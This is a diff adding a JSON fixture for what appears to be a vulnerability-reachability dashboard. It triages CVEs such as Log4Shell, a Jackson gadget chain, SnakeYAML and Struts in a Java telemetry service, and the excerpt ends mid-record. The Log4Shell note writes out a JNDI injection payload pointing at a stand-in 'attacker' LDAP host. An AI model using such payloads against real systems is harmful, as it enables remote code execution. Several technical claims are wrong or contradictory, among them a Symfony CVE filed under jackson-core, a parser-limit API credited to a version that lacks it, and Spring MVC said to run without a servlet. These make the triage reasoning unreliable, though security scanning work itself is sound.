@@ -1,0 +1,1199 @@
+{
+  "scanMeta": {
+    "workspace": "acme-platform",
+    "repository": "acme/telemetry-api",
+    "branch": "release/2026.10",
+    "commit": "8f21a3c",
+    "commitLong": "8f21a3c4d90b7e5f1a2c6b83d4e5f60718293a4bc5",
+    "pipeline": "trace-scan/production-eu-1",
+    "sbom": "CycloneDX 1.6 · 1,482 components",
+    "duration": "4m 12s",
+    "scannedAt": "2026-10-02T09:14:22Z",
+    "triggeredBy": "renovate[bot] / openshift-ci"
+  },
+  "aiRuntime": {
+    "model": "qwen2.5-coder:7b",
+    "quantisation": "Q4_K_M",
+    "device": "cuda:0 · NVIDIA L4 24GB",
+    "egress": "0 bytes",
+    "host": "in-cluster · eu-west-1"
+  },
+  "engines": [
+    {
+      "name": "Trivy",
+      "version": "0.58.1"
+    },
+    {
+      "name": "Grype",
+      "version": "0.87.0"
+    },
+    {
+      "name": "Semgrep",
+      "version": "1.99.0"
+    },
+    {
+      "name": "OSV-Scanner",
+      "version": "1.9.2"
+    },
+    {
+      "name": "Syft",
+      "version": "1.18.1"
+    }
+  ],
+  "funnelStages": [
+    {
+      "key": "raw",
+      "label": "Raw findings ingested",
+      "value": 15080,
+      "engine": "Trivy · Grype · OSV-Scanner",
+      "operation": "Filesystem, dependency and SBOM matchers, no dedup"
+    },
+    {
+      "key": "packages",
+      "label": "Unique package groups",
+      "value": 13,
+      "engine": "TRACE indexer",
+      "operation": "Collapse on (package, version, CVE) + SHA-256 artifact prefix"
+    },
+    {
+      "key": "reachable",
+      "label": "Symbol reachable in call graph",
+      "value": 2,
+      "engine": "Semgrep call graph",
+      "operation": "Inter-procedural reachability from live entrypoints, 4 hops"
+    },
+    {
+      "key": "exploitable",
+      "label": "Contextually exploitable",
+      "value": 2,
+      "engine": "qwen2.5-coder:7b",
+      "operation": "Local inference: taint survives to sink with no sanitiser"
+    }
+  ],
+  "nav": [
+    {
+      "id": "overview",
+      "label": "Overview",
+      "glyph": "grid",
+      "badge": null
+    },
+    {
+      "id": "findings",
+      "label": "Findings",
+      "glyph": "list",
+      "badge": "13"
+    },
+    {
+      "id": "reachability",
+      "label": "Reachability",
+      "glyph": "graph",
+      "badge": "2"
+    },
+    {
+      "id": "sbom",
+      "label": "Dependency graph",
+      "glyph": "layers",
+      "badge": "1482"
+    },
+    {
+      "id": "vex",
+      "label": "VEX reports",
+      "glyph": "doc",
+      "badge": "0"
+    }
+  ],
+  "findings": [
+    {
+      "id": "FND-8F21A3",
+      "cve": "CVE-2021-44228",
+      "packageName": "org.apache.logging.log4j:log4j-core",
+      "version": "2.14.1",
+      "ecosystem": "maven",
+      "rawCount": 1142,
+      "severity": "critical",
+      "cvss": 9.8,
+      "reachability": "reachable",
+      "verdict": "affected",
+      "confidence": 0.96,
+      "cwe": [
+        "CWE-502",
+        "CWE-917"
+      ],
+      "fixedIn": "2.17.1",
+      "dependencyPath": [
+        "acme/telemetry-api",
+        "acme/telemetry-spi",
+        "acme/logging-bridge",
+        "org.apache.logging.log4j:log4j-core"
+      ],
+      "frames": [
+        {
+          "symbol": "AuditController.record()",
+          "location": "src/main/java/com/acme/telemetry/http/AuditController.java",
+          "line": 64,
+          "kind": "entrypoint",
+          "note": "POST /api/v1/audit/event · @RequestMapping, no authentication filter in front of it",
+          "edge": "taint: request header X-Trace-Id → arg traceId"
+        },
+        {
+          "symbol": "AuditEventDispatcher.emit()",
+          "location": "src/main/java/com/acme/telemetry/audit/AuditEventDispatcher.java",
+          "line": 118,
+          "kind": "service",
+          "note": "@Async(\"audit-pool\") · returns immediately, sink runs on pool-4-thread-1",
+          "edge": "taint preserved across async boundary"
+        },
+        {
+          "symbol": "AuditLogger.info(String, Object...)",
+          "location": "src/main/java/com/acme/telemetry/audit/AuditLogger.java",
+          "line": 57,
+          "kind": "internal",
+          "note": "String.format(\"trace=%s action=%s\", traceId, action) — no sanitiser, no escaping",
+          "edge": "template string passed as message argument"
+        },
+        {
+          "symbol": "Log4j2Logger.info(Marker, String, Object...)",
+          "location": "org.apache.logging.log4j:log4j-api@2.14.1",
+          "line": null,
+          "kind": "library",
+          "note": "Cross-package boundary: log4j-api → log4j-core; message argument forwarded untouched",
+          "edge": "Log4jLogEvent.Builder.message() — lookups enabled"
+        },
+        {
+          "symbol": "JndiLookup.lookup(LogEvent, String)",
+          "location": "org.apache.logging.log4j:log4j-core@2.14.1",
+          "line": 2118,
+          "kind": "sink",
+          "note": "Default lookup for the \"jndi:\" scheme. ${${lower:jndi:ldap://attacker/a}} triggers InitialContext.lookup() — no scheme restriction, no allow-list.",
+          "vulnerable": true
+        }
+      ],
+      "evidence": {
+        "model": "qwen2.5-coder:7b",
+        "runtime": "Q4_K_M · cuda:0 · NVIDIA L4 24GB",
+        "confidence": 0.96,
+        "headline": "Exploitable — untrusted input reaches JndiLookup.lookup() unfiltered",
+        "reasoning": "The reachability engine resolves a four-hop chain from the public HTTP entrypoint AuditController.record() to org.apache.logging.log4j.core.lookup.JndiLookup#lookup inside log4j-core 2.14.1. The chain is not a static false positive: the string that reaches the sink is the value of the X-Trace-Id request header, read at AuditController.java:67 and forwarded verbatim as argument 1 of AuditLogger.info(String, Object...) through the @Async(\"audit-pool\") dispatcher. AuditLogger builds the message template with String.format at line 57 and passes it to the Log4j2Logger.info overload, so the log4j-api 2.14.1 → log4j-core 2.14.1 boundary is crossed with a fully attacker-controlled first argument. JndiLookup#lookup is installed as the default Lookup for the \"jndi:\" scheme and is not disabled anywhere in the shipped runtime configuration: log4j2.component.properties sets only the properties configuration, and no log4j2.component.properties entry, system property or manifest attribute neutralises the lookup. Because message lookups are evaluated for every event at INFO level, any request reaching /api/v1/audit/event performs an outbound LDAP/RMI resolution of attacker-controlled data.",
+        "taintSource": "HTTP request header `X-Trace-Id` → request.getHeader(\"X-Trace-Id\")",
+        "taintPropagation": [
+          "AuditController.java:67 — header read into String traceId, no validation or allow-list",
+          "AuditEventDispatcher.java:118 — carried across an @Async thread boundary; taint preserved in the task payload, no defensive copy",
+          "AuditLogger.java:57 — concatenated into a message template via String.format, never passed to a sanitiser",
+          "Log4j2Logger#info → Log4jLogEvent.Builder — message argument 1 crosses into log4j-core",
+          "JndiLookup#lookup — ${...} expanded against the \"jndi\" scheme, no scheme restriction"
+        ],
+        "sink": "org.apache.logging.log4j.core.lookup.JndiLookup#lookup(LogEvent, String) — log4j-core-2.14.1.jar!org/apache/logging/log4j/core/lookup/JndiLookup.class",
+        "counterfactual": "Semgrep alone reports CVE-2021-44228 as present-in-dependency for every artifact with log4j-core in the graph, which is 11 of the 15,080 raw records here. Reachability plus taint survivability is what separates the one exploitable call site from the ten dead ones.",
+        "signals": [
+          {
+            "label": "Taint survives to sink",
+            "value": "5 / 5 hops",
+            "tone": "positive"
+          },
+          {
+            "label": "Sanitiser on path",
+            "value": "none detected",
+            "tone": "negative"
+          },
+          {
+            "label": "Cross-package edge",
+            "value": "log4j-api → log4j-core",
+            "tone": "positive"
+          },
+          {
+            "label": "Attacker-controlled arg index",
+            "value": "arg[1] (message)",
+            "tone": "negative"
+          },
+          {
+            "label": "Guard / mitigation",
+            "value": "log4j2.formatMsgNoLookups not set",
+            "tone": "negative"
+          },
+          {
+            "label": "Reachable from",
+            "value": "HTTP :8443/audit/event",
+            "tone": "positive"
+          }
+        ],
+        "remediation": [
+          "Upgrade org.apache.logging.log4j:log4j-core to 2.17.1 (removes JndiLookup message expansion).",
+          "As a defence in depth, set -Dlog4j2.formatMsgNoLookups=true and pin a Lookup factory that refuses jndi: schemes.",
+          "Strip X-Trace-Id at the edge proxy and re-derive it from the incoming request-id so untrusted headers never reach audit sinks."
+        ]
+      }
+    },
+    {
+      "id": "FND-8F21B7",
+      "cve": "CVE-2020-9548",
+      "packageName": "com.fasterxml.jackson.core:jackson-databind",
+      "version": "2.9.10.4",
+      "ecosystem": "maven",
+      "rawCount": 968,
+      "severity": "high",
+      "cvss": 7.8,
+      "reachability": "reachable",
+      "verdict": "affected",
+      "confidence": 0.91,
+      "cwe": [
+        "CWE-502"
+      ],
+      "fixedIn": "2.13.2.2",
+      "dependencyPath": [
+        "acme/telemetry-api",
+        "acme/telemetry-bridge",
+        "com.fasterxml.jackson.core:jackson-databind"
+      ],
+      "frames": [
+        {
+          "symbol": "WebhookController.handle()",
+          "location": "src/main/java/com/acme/integrations/WebhookController.java",
+          "line": 88,
+          "kind": "entrypoint",
+          "note": "POST /api/v1/webhooks/{provider} · partner-facing, signature check happens after binding",
+          "edge": "taint: request body (attacker-controlled JSON)"
+        },
+        {
+          "symbol": "WebhookPayloadBinder.bind(String)",
+          "location": "src/main/java/com/acme/integrations/WebhookPayloadBinder.java",
+          "line": 47,
+          "kind": "service",
+          "note": "mapper.readValue(raw, WebhookPayload.class) on the shared default-typing ObjectMapper",
+          "edge": "taint: raw JSON preserved byte-for-byte"
+        },
+        {
+          "symbol": "ObjectMapper._readMapAndClose()",
+          "location": "com.fasterxml.jackson.core:jackson-databind@2.9.10.4",
+          "line": null,
+          "kind": "library",
+          "note": "enableDefaultTyping() resolves every nested @type property as an arbitrary class name",
+          "edge": "DeserializerCache._createAndCache2 → Class.forName"
+        },
+        {
+          "symbol": "BeanDeserializer.deserializeFromObject()",
+          "location": "com.fasterxml.jackson.core:jackson-databind@2.9.10.4",
+          "line": null,
+          "kind": "library",
+          "note": "Instantiates the class named by the attacker @type property; no PolymorphicTypeValidator registered",
+          "edge": "binding org.apache.xbean.propertyeditor.JndiConverter"
+        },
+        {
+          "symbol": "JndiConverter.toString()",
+          "location": "org.apache.xbean:xbean-propertyeditor@4.19.3",
+          "line": null,
+          "kind": "sink",
+          "note": "Gadget class on the runtime classpath inside telemetry-api-bridge-1.4.0.jar — calls InitialContext.lookup() from toString().",
+          "vulnerable": true
+        }
+      ],
+      "evidence": {
+        "model": "qwen2.5-coder:7b",
+        "runtime": "Q4_K_M · cuda:0 · NVIDIA L4 24GB",
+        "confidence": 0.91,
+        "headline": "Exploitable — webhook body deserialised with polymorphic typing enabled",
+        "reasoning": "WebhookController.handle() reads the raw request body and hands it to WebhookPayloadBinder.bind(String), which calls ObjectMapper.readValue(String, Class) on an attacker-controlled JSON document from a partner endpoint. The mapper is configured with mapper.enableDefaultTyping() through a custom JacksonConfig @Bean, so every nested object is resolved through a type-id property instead of the declared static type. The transitive classpath contains org.apache.xbean:xbean-propertyeditor at version 4.19.3, whose JndiConverter class invokes InitialContext.lookup() from its toString(). Because no PolymorphicTypeValidator is installed, jackson-databind 2.9.10.4 happily binds that gadget, which turns a JSON POST into an outbound JNDI resolution. The class is only present in the test fixture module in source control, but it is compiled into the shaded artifact telemetry-api-bridge-1.4.0.jar that the deployment image loads, so it is on the production classpath.",
+        "taintSource": "HTTP POST body → WebhookController request.getReader() → WebhookPayloadBinder.bind",
+        "taintPropagation": [
+          "WebhookController.java:88 — raw body read without size bound or schema validation",
+          "WebhookPayloadBinder.java:47 — ObjectMapper configured with enableDefaultTyping() and no PolymorphicTypeValidator",
+          "ObjectMapper#_readMapAndClose — default typing resolves every @type property as a class name",
+          "BeanDeserializer.deserializeFromObject — org.apache.xbean.propertyeditor.JndiConverter bound via type id",
+          "JndiConverter#toString — InitialContext.lookup(env.getProperty(\"key\")) reached"
+        ],
+        "sink": "com.fasterxml.jackson.databind.deser.std.DeserializerCache._createAndCache2 → java.lang.Class.forName(JndiConverter) → javax.naming.InitialContext#lookup",
+        "counterfactual": "OSV and Trivy both flag CVE-2020-9548 purely on the presence of jackson-databind < 2.10. The binding site is one @RestController method wide; reachability shows whether any external input reaches it, which is the only question that decides the SLA.",
+        "signals": [
+          {
+            "label": "Taint survives to sink",
+            "value": "5 / 5 hops",
+            "tone": "positive"
+          },
+          {
+            "label": "Polymorphic typing",
+            "value": "enableDefaultTyping()",
+            "tone": "negative"
+          },
+          {
+            "label": "Gadget class on runtime classpath",
+            "value": "xbean-propertyeditor 4.19.3",
+            "tone": "negative"
+          },
+          {
+            "label": "Type validator",
+            "value": "none installed",
+            "tone": "negative"
+          },
+          {
+            "label": "Input trust boundary",
+            "value": "external partner webhook",
+            "tone": "positive"
+          },
+          {
+            "label": "Payload size bound",
+            "value": "none (readers unbounded)",
+            "tone": "negative"
+          }
+        ],
+        "remediation": [
+          "Upgrade com.fasterxml.jackson.core:jackson-databind to 2.15.4 and remove enableDefaultTyping() in favour of a JsonTypeInfo.Id.NAME allow-list.",
+          "Install a PolymorphicTypeValidator that rejects any base type outside the com.acme.integrations.model package.",
+          "Move org.apache.xbean:xbean-propertyeditor out of the compile scope of telemetry-api-bridge."
+        ]
+      }
+    },
+    {
+      "id": "FND-8F21C1",
+      "cve": "CVE-2022-1471",
+      "packageName": "org.yaml:snakeyaml",
+      "version": "1.26",
+      "ecosystem": "maven",
+      "rawCount": 743,
+      "severity": "critical",
+      "cvss": 9.8,
+      "reachability": "unreachable",
+      "verdict": "not_affected",
+      "confidence": 0.97,
+      "cwe": [
+        "CWE-502",
+        "CWE-20"
+      ],
+      "fixedIn": "2.0",
+      "dependencyPath": [
+        "acme/telemetry-api",
+        "org.yaml:snakeyaml"
+      ],
+      "blocker": "All three Yaml() constructions in the reachable subgraph pass an explicit SafeConstructor, so global tag resolution is never enabled.",
+      "frames": [
+        {
+          "symbol": "ConfigLoader.load(Path)",
+          "location": "src/main/java/com/acme/telemetry/config/ConfigLoader.java",
+          "line": 31,
+          "kind": "entrypoint",
+          "note": "Reads a file from the container image, never from request data",
+          "edge": "taint: filesystem path, fixed at build time"
+        },
+        {
+          "symbol": "new Yaml(new SafeConstructor(new LoaderOptions()))",
+          "location": "src/main/java/com/acme/telemetry/config/ConfigLoader.java",
+          "line": 39,
+          "kind": "library",
+          "note": "SafeConstructor rejects !!java/object and all custom tags",
+          "edge": "global tag resolution never enabled"
+        },
+        {
+          "symbol": "Barrier — no unsafe Yaml() construction",
+          "location": "semgrep rule: java.lang.snakeyaml.insecure-constructor",
+          "line": null,
+          "kind": "barrier",
+          "note": "The three remaining Yaml() call sites are inside src/test and are pruned from the reachable subgraph before analysis."
+        }
+      ],
+      "evidence": {
+        "model": "qwen2.5-coder:7b",
+        "runtime": "Q4_K_M · cuda:0 · NVIDIA L4 24GB",
+        "confidence": 0.97,
+        "headline": "Not exploitable — the vulnerable constructor is never used at runtime",
+        "reasoning": "CVE-2022-1471 requires the default Constructor to resolve arbitrary !! tags. Every Yaml instantiation reachable from a live entrypoint passes new SafeConstructor(LoaderOptions), which whitelists primitives, arrays and maps and throws on anything else. The three calls that omit a constructor live in the test sources; the reachability engine prunes test-scoped code paths before building the subgraph, so they cannot contribute a path. The input to ConfigLoader is a path baked into the image rather than request data, so even a future regression to the default constructor would need a configuration-tampering primitive first. This is the textbook case of a critical CVSS score with no exploitability, and it is 1 of 10 findings in this scan that a scanner-only workflow would page an engineer about.",
+        "counterfactual": "Scanner-only triage reports this at critical severity with the same certainty as Log4Shell, because both share a package name and an advisory. Only the constructor call site distinguishes them.",
+        "signals": [
+          {
+            "label": "Unsafe constructor",
+            "value": "never constructed",
+            "tone": "positive"
+          },
+          {
+            "label": "Taint source",
+            "value": "image filesystem only",
+            "tone": "positive"
+          },
+          {
+            "label": "Call sites in runtime graph",
+            "value": "3 / 3 use SafeConstructor",
+            "tone": "positive"
+          },
+          {
+            "label": "Scanner severity",
+            "value": "critical 9.8",
+            "tone": "negative"
+          }
+        ],
+        "remediation": [
+          "No action required. Keep pinng org.yaml:snakeyaml at 1.26 until the compatibility work for 2.x lands.",
+          "Add the semgrep rule java.lang.snakeyaml.insecure-constructor to the pre-merge gate so a future regression is caught in code review."
+        ]
+      }
+    },
+    {
+      "id": "FND-8F21D4",
+      "cve": "CVE-2022-45868",
+      "packageName": "com.h2database:h2",
+      "version": "2.1.210",
+      "ecosystem": "maven",
+      "rawCount": 402,
+      "severity": "critical",
+      "cvss": 9.8,
+      "reachability": "unreachable",
+      "verdict": "not_affected",
+      "confidence": 0.95,
+      "cwe": [
+        "CWE-94"
+      ],
+      "fixedIn": "2.1.214",
+      "dependencyPath": [
+        "acme/telemetry-api",
+        "com.h2database:h2"
+      ],
+      "blocker": "The JDBC URL is a compile-time constant in DataSourceFactory; no user-controlled value is ever concatenated into it.",
+      "frames": [
+        {
+          "symbol": "DataSourceFactory.hikari()",
+          "location": "src/main/java/com/acme/telemetry/store/DataSourceFactory.java",
+          "line": 52,
+          "kind": "entrypoint",
+          "note": "Bean construction at startup, no request data involved",
+          "edge": "taint: none"
+        },
+        {
+          "symbol": "DriverManager.getConnection(\"jdbc:h2:mem:telemetry\")",
+          "location": "src/main/java/com/acme/telemetry/store/DataSourceFactory.java",
+          "line": 61,
+          "kind": "library",
+          "note": "Hard-coded in-memory URL, INIT and TRACE_LEVEL_FILE never set",
+          "edge": "no attacker-controlled URL component"
+        },
+        {
+          "symbol": "Barrier — no controllable JDBC URL",
+          "location": "semgrep rule: java.sql.jdbc-url-injection",
+          "line": null,
+          "kind": "barrier",
+          "note": "CVE-2022-45868 requires the URL to carry INIT=RUNSCRIPT FROM or a crafted database name; neither is constructible from application data."
+        }
+      ],
+      "evidence": {
+        "model": "qwen2.5-coder:7b",
+        "runtime": "Q4_K_M · cuda:0 · NVIDIA L4 24GB",
+        "confidence": 0.95,
+        "headline": "Not exploitable — the in-memory datasource URL is a constant",
+        "reasoning": "The advisory hinges on a crafted JDBC URL reaching DriverManager.getConnection. DataSourceFactory builds the URL from a String constant and passes a HikariConfig with no url override, so the only values H2 ever parses are the ones in the compiled class. Query parameters come from Spring JdbcTemplate parameter binding, which never alters connection metadata. The H2 console is not enabled and TRACE_LEVEL_FILE is absent from the image, closing the two secondary vectors.",
+        "counterfactual": "The advisory is scored 9.8 regardless of deployment mode, so container scanners flag the embedded library identically to an internet-facing H2 console.",
+        "signals": [
+          {
+            "label": "JDBC URL source",
+            "value": "String constant",
+            "tone": "positive"
+          },
+          {
+            "label": "H2 console enabled",
+            "value": "no",
+            "tone": "positive"
+          },
+          {
+            "label": "TRACE_LEVEL_FILE",
+            "value": "not set",
+            "tone": "positive"
+          },
+          {
+            "label": "Reachable sink",
+            "value": "none",
+            "tone": "positive"
+          }
+        ],
+        "remediation": [
+          "No action required. If a persistent file datasource is introduced later, re-run reachability before shipping."
+        ]
+      }
+    },
+    {
+      "id": "FND-8F21E9",
+      "cve": "CVE-2017-5638",
+      "packageName": "org.apache.struts:struts2-core",
+      "version": "2.3.31",
+      "ecosystem": "maven",
+      "rawCount": 811,
+      "severity": "critical",
+      "cvss": 8.1,
+      "reachability": "unreachable",
+      "verdict": "not_affected",
+      "confidence": 0.94,
+      "cwe": [
+        "CWE-20",
+        "CWE-94"
+      ],
+      "fixedIn": "2.5.33",
+      "dependencyPath": [
+        "acme/telemetry-api",
+        "acme/legacy-adapter",
+        "org.apache.struts:struts2-core"
+      ],
+      "blocker": "The OGNL path is selected by the Content-Type header, which the embedded connector cannot deliver to a Struts filter.",
+      "frames": [
+        {
+          "symbol": "LegacyImportController.upload()",
+          "location": "src/main/java/com/acme/legacy/LegacyImportController.java",
+          "line": 44,
+          "kind": "entrypoint",
+          "note": "Mapped to the Netty router, not to a javax.servlet.Filter chain",
+          "edge": "Content-Type never reaches Struts dispatch"
+        },
+        {
+          "symbol": "Dispatcher.prepareMultipartRequest()",
+          "location": "org.apache.struts:struts2-core@2.3.31",
+          "line": null,
+          "kind": "library",
+          "note": "Reachable only through StrutsFilter → Dispatcher; the app has no StrutsFilter registered",
+          "edge": "dispatcher has no caller in the reachable subgraph"
+        },
+        {
+          "symbol": "Barrier — no servlet filter chain",
+          "location": "src/main/java/com/acme/telemetry/http/Router.java",
+          "line": 28,
+          "kind": "barrier",
+          "note": "telemetry-api runs on embedded Netty. The Content-Type OGNL trick of CVE-2017-5638 needs the Apache Struts PreparedListener, which is not deployed."
+        }
+      ],
+      "evidence": {
+        "model": "qwen2.5-coder:7b",
+        "runtime": "Q4_K_M · cuda:0 · NVIDIA L4 24GB",
+        "confidence": 0.94,
+        "headline": "Not exploitable — Struts dispatcher is unreachable in this deployment",
+        "reasoning": "struts2-core arrives transitively through acme/legacy-adapter, which is compiled against it for model classes only. The runtime is an embedded Netty server; there is no StrutsFilter, no web.xml and no Dispatcher bound to a route, so the Content-Type OGNL evaluation that defines CVE-2017-5638 has no invocation path. The artifact is dead weight on the classpath rather than an attack surface, and it should still be removed for hygiene.",
+        "counterfactual": "Container scanners see a struts2-core jar and a critical CVE and have no way to know that nothing dispatches Struts requests.",
+        "signals": [
+          {
+            "label": "StrutsFilter registered",
+            "value": "no",
+            "tone": "positive"
+          },
+          {
+            "label": "Runtime server",
+            "value": "embedded Netty",
+            "tone": "positive"
+          },
+          {
+            "label": "Artifact usage",
+            "value": "POJOs only",
+            "tone": "neutral"
+          },
+          {
+            "label": "Attack surface",
+            "value": "none",
+            "tone": "positive"
+          }
+        ],
+        "remediation": [
+          "No security action required.",
+          "Drop the struts2-core dependency from acme/legacy-adapter so the artifact stops entering the SBOM and future scans."
+        ]
+      }
+    },
+    {
+      "id": "FND-8F21F2",
+      "cve": "CVE-2022-22965",
+      "packageName": "org.springframework:spring-web",
+      "version": "5.3.15",
+      "ecosystem": "maven",
+      "rawCount": 693,
+      "severity": "high",
+      "cvss": 7.8,
+      "reachability": "unreachable",
+      "verdict": "not_affected",
+      "confidence": 0.93,
+      "cwe": [
+        "CWE-668"
+      ],
+      "fixedIn": "5.3.18",
+      "dependencyPath": [
+        "acme/telemetry-api",
+        "org.springframework:spring-web"
+      ],
+      "blocker": "The advisory is specific to functional web servers (Tomcat, WildFly, WebSphere); the app uses Spring MVC on Netty with no Servlet service.",
+      "frames": [
+        {
+          "symbol": "TelemetryController.ingest()",
+          "location": "src/main/java/com/acme/telemetry/http/TelemetryController.java",
+          "line": 72,
+          "kind": "entrypoint",
+          "note": "Spring MVC DispatcherServlet mapping, running on the embedded Netty bridge",
+          "edge": "taint: JSON body only"
+        },
+        {
+          "symbol": "DataBinder.bind()",
+          "location": "org.springframework:spring-web@5.3.15",
+          "line": null,
+          "kind": "library",
+          "note": "DataBinder path is present but receives a fixed schema, no class-parameter binding",
+          "edge": "no attacker-supplied parameter names"
+        },
+        {
+          "symbol": "Barrier — no Servlet container",
+          "location": "src/main/java/com/acme/telemetry/http/NettyBootstrap.java",
+          "line": 19,
+          "kind": "barrier",
+          "note": "Tomcat/WAS not on the classpath, so the ClassLoader-based gadget chain of CVE-2022-22965 cannot be assembled."
+        }
+      ],
+      "evidence": {
+        "model": "qwen2.5-coder:7b",
+        "runtime": "Q4_K_M · cuda:0 · NVIDIA L4 24GB",
+        "confidence": 0.93,
+        "headline": "Not exploitable — exploit requires a Servlet container that is not deployed",
+        "reasoning": "Spring Framework RCE (CVE-2022-22965) needs either a functional Servlet container or a WebFlux app using DataBinder with attacker-controlled parameter names. This service runs Spring MVC over embedded Netty; there is no Servlet service implementation on the classpath, so the standard ClassLoader gadget chain cannot be built. WebFlux is not a dependency and no @ModelAttribute method binds request parameters.",
+        "counterfactual": "The advisory has no environment qualifier in most scanners, so every service in the estate receives a high-severity page for this one artifact.",
+        "signals": [
+          {
+            "label": "Servlet container",
+            "value": "not present",
+            "tone": "positive"
+          },
+          {
+            "label": "WebFlux",
+            "value": "not a dependency",
+            "tone": "positive"
+          },
+          {
+            "label": "@ModelAttribute binding",
+            "value": "absent",
+            "tone": "positive"
+          }
+        ],
+        "remediation": [
+          "No action required. Upgrade to 5.3.18 opportunistically with the next dependency train."
+        ]
+      }
+    },
+    {
+      "id": "FND-8F2205",
+      "cve": "CVE-2023-24998",
+      "packageName": "commons-fileupload:commons-fileupload",
+      "version": "1.3.2",
+      "ecosystem": "maven",
+      "rawCount": 517,
+      "severity": "high",
+      "cvss": 7.5,
+      "reachability": "unreachable",
+      "verdict": "not_affected",
+      "confidence": 0.92,
+      "cwe": [
+        "CWE-434"
+      ],
+      "fixedIn": "1.5",
+      "dependencyPath": [
+        "acme/telemetry-api",
+        "acme/ingest-service",
+        "commons-fileupload:commons-fileupload"
+      ],
+      "blocker": "The only FileUploadBase#parseRequest call site is annotated @Profile(\"import-legacy\"), which is not active in any deployed environment.",
+      "frames": [
+        {
+          "symbol": "AdminImportController.parse()",
+          "location": "src/main/java/com/acme/ingest/AdminImportController.java",
+          "line": 96,
+          "kind": "entrypoint",
+          "note": "@Profile(\"import-legacy\") · excluded by TRACE profile resolution for prod-eu-1",
+          "edge": "bean not registered → no route"
+        },
+        {
+          "symbol": "FileUploadBase.parseRequest()",
+          "location": "commons-fileupload:commons-fileupload@1.3.2",
+          "line": null,
+          "kind": "library",
+          "note": "Vulnerable method itself — would write a temp file named after the client-supplied filename",
+          "edge": "no caller after profile pruning"
+        },
+        {
+          "symbol": "Barrier — profile-gated bean",
+          "location": "TRACE profile resolver · spring.profiles.active=prod-eu-1",
+          "line": null,
+          "kind": "barrier",
+          "note": "Bean-definition pruning happens before graph construction, so the vulnerable method has zero inbound edges."
+        }
+      ],
+      "evidence": {
+        "model": "qwen2.5-coder:7b",
+        "runtime": "Q4_K_M · cuda:0 · NVIDIA L4 24GB",
+        "confidence": 0.92,
+        "headline": "Not exploitable — the single call site is disabled by build profile",
+        "reasoning": "CVE-2023-24998 is a one-shot file write driven by the Content-Disposition filename in a multipart body. commons-fileupload reaches the runtime only through acme/ingest-service, and its sole parseRequest invocation sits behind @Profile(\"import-legacy\"), which is absent from every deployed profile. TRACE resolves Spring profile conditionals before building the call graph, so the vulnerable method is present in the jar but has no inbound edge, which is materially different from a disabled check that still executes.",
+        "counterfactual": "Without profile-aware graph construction the method looks live, and the finding is indistinguishable from the two confirmed exploitable ones.",
+        "signals": [
+          {
+            "label": "Inbound edges to sink",
+            "value": "0",
+            "tone": "positive"
+          },
+          {
+            "label": "Active profile",
+            "value": "prod-eu-1",
+            "tone": "positive"
+          },
+          {
+            "label": "Guarding condition",
+            "value": "@Profile(\"import-legacy\")",
+            "tone": "positive"
+          }
+        ],
+        "remediation": [
+          "No action required.",
+          "Delete acme/legacy-admin before the next major so the dependency leaves the SBOM entirely."
+        ]
+      }
+    },
+    {
+      "id": "FND-8F221A",
+      "cve": "CVE-2018-14773",
+      "packageName": "com.fasterxml.jackson.core:jackson-core",
+      "version": "2.9.10",
+      "ecosystem": "maven",
+      "rawCount": 284,
+      "severity": "high",
+      "cvss": 7.5,
+      "reachability": "unreachable",
+      "verdict": "not_affected",
+      "confidence": 0.9,
+      "cwe": [
+        "CWE-400"
+      ],
+      "fixedIn": "2.9.10.1",
+      "dependencyPath": [
+        "acme/telemetry-api",
+        "acme/telemetry-spi",
+        "com.fasterxml.jackson.core:jackson-core"
+      ],
+      "blocker": "Streaming parser depth is bounded by StreamReadConstraints on every factory used in the reachable subgraph.",
+      "frames": [
+        {
+          "symbol": "TelemetryIngestReader.read()",
+          "location": "src/main/java/com/acme/telemetry/ingest/TelemetryIngestReader.java",
+          "line": 58,
+          "kind": "entrypoint",
+          "note": "Streaming read of an NDJSON frame from the ingest socket",
+          "edge": "taint: frame payload"
+        },
+        {
+          "symbol": "JsonFactory.createParser()",
+          "location": "com.fasterxml.jackson.core:jackson-core@2.9.10",
+          "line": null,
+          "kind": "library",
+          "note": "Constraint is applied at the factory level in JsonMapperConfig, not per call",
+          "edge": "maxNestingDepth = 24 enforced"
+        },
+        {
+          "symbol": "Barrier — nesting depth bounded",
+          "location": "src/main/java/com/acme/telemetry/config/JsonMapperConfig.java",
+          "line": 26,
+          "kind": "barrier",
+          "note": "Unbounded nested-array stack exhaustion requires the parser default of 1,000 levels; the codebase sets 24."
+        }
+      ],
+      "evidence": {
+        "model": "qwen2.5-coder:7b",
+        "runtime": "Q4_K_M · cuda:0 · NVIDIA L4 24GB",
+        "confidence": 0.9,
+        "headline": "Not exploitable — parser nesting depth is constrained globally",
+        "reasoning": "The vector is a deeply nested JSON array that drives the pre-2.9.10.1 recursive parser into stack exhaustion. JsonMapperConfig sets a nesting constraint of 24 on the shared JsonFactory, so a malicious frame is rejected with a StreamConstraintsException during streaming rather than reaching the parser recursion. The ingest path uses that factory exclusively.",
+        "counterfactual": "A naive \"is jackson-core upgraded?\" rule would demand an immediate upgrade even though the failure mode is already structurally prevented.",
+        "signals": [
+          {
+            "label": "Max nesting depth",
+            "value": "24",
+            "tone": "positive"
+          },
+          {
+            "label": "Rejection behaviour",
+            "value": "StreamConstraintsException",
+            "tone": "positive"
+          },
+          {
+            "label": "Unconstrained factories",
+            "value": "none",
+            "tone": "positive"
+          }
+        ],
+        "remediation": [
+          "No action required. Plan an upgrade to 2.17.x with the Jackson train that also resolves CVE-2020-9548."
+        ]
+      }
+    },
+    {
+      "id": "FND-8F222E",
+      "cve": "CVE-2023-34462",
+      "packageName": "io.netty:netty-handler",
+      "version": "4.1.68",
+      "ecosystem": "maven",
+      "rawCount": 366,
+      "severity": "medium",
+      "cvss": 5.3,
+      "reachability": "unreachable",
+      "verdict": "not_affected",
+      "confidence": 0.9,
+      "cwe": [
+        "CWE-400"
+      ],
+      "fixedIn": "4.1.86",
+      "dependencyPath": [
+        "acme/telemetry-api",
+        "acme/telemetry-edge",
+        "io.netty:netty-handler"
+      ],
+      "blocker": "HTTP/2 is not negotiated on either the listener or the upstream client; ALPN advertises http/1.1 only.",
+      "frames": [
+        {
+          "symbol": "NettyBootstrap.init()",
+          "location": "src/main/java/com/acme/telemetry/http/NettyBootstrap.java",
+          "line": 44,
+          "kind": "entrypoint",
+          "note": "Server bootstrap with HttpServerCodec",
+          "edge": "h2c upgrade never offered"
+        },
+        {
+          "symbol": "Http2FrameCodec",
+          "location": "io.netty:netty-handler@4.1.68",
+          "line": null,
+          "kind": "library",
+          "note": "Vulnerable handler class — present in the jar, absent from the pipeline",
